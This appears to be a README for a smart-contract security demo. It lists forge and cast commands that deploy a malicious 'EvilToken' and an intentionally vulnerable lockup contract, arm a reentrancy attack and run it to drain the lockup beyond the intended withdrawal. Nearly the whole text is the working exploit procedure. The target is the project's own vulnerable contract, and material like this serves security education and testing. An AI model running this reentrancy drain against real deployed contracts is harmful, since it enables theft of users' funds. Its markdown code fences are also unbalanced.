# 🔥 Real Exploit Demonstration (cast workflow)

This project intentionally uses cast send to simulate a REAL attacker interaction flow instead of relying only on forge test.

---

# 1️⃣ Deploy EvilToken

TOKEN=$(forge create src/EvilToken.sol:EvilToken \
  --rpc-url $RPC \
  --private-key $DEPLOYER_PK \
  | grep "Deployed to:" | awk '{print $3}')
Verify:

echo $TOKEN
cast code $TOKEN
---

# 2️⃣ Deploy Vulnerable Lockup

UNLOCK_TIME=$(($(date +%s) - 10))

LOCKUP=$(forge create src/LockupVulnerable.sol:LockupVulnerable \
  --rpc-url $RPC \
  --private-key $DEPLOYER_PK \
  --constructor-args $TOKEN $TOKEN $UNLOCK_TIME \
  | grep "Deployed to:" | awk '{print $3}')
Verify:

echo $LOCKUP
cast code $LOCKUP
---

# 3️⃣ Configure EvilToken Target

cast send $TOKEN \
  "setTarget(address)" \
  $LOCKUP \
  --private-key $DEPLOYER_PK \
  --rpc-url $RPC
---

# 4️⃣ Disable Attack During Funding

cast send $TOKEN \
  "setAttack(bool)" false \
  --private-key $DEPLOYER_PK \
  --rpc-url $RPC
---

# 5️⃣ Fund Lockup

cast send $TOKEN \
  "transfer(address,uint256)" \
  $LOCKUP 100000000000000000000 \
  --private-key $DEPLOYER_PK \
  --rpc-url $RPC
---

# 6️⃣ Register Deposit

cast send $LOCKUP \
  "deposit(uint256)" \
  100000000000000000000 \
  --private-key $ATTACKER_PK \
  --rpc-url $RPC
---

# 7️⃣ Enable Reentrancy Attack

cast send $TOKEN \
  "setAttack(bool)" true \
  --private-key $ATTACKER_PK \
  --rpc-url $RPC
---

# 8️⃣ Check Balances BEFORE Exploit

cast call $TOKEN \
  "balanceOf(address)" \
  $LOCKUP \
  --rpc-url $RPC
```bash
cast call $TOKEN \
  "balanceOf(address)" \
  $TOKEN \
  --rpc-url $RPC

---

# 9️⃣ Execute Exploit

bash
cast send $TOKEN \
  "attack()" \
  --private-key $ATTACKER_PK \
  --rpc-url $RPC

---

# 🔟 Check Balances AFTER Exploit

bash
cast call $TOKEN \
  "balanceOf(address)" \
  $LOCKUP \
  --rpc-url $RPC


bash
cast call $TOKEN \
  "balanceOf(address)" \
  $TOKEN \
  --rpc-url $RPC

If the exploit succeeds:

text
Lockup balance decreases repeatedly
Attacker balance increases beyond intended withdrawal amount
`
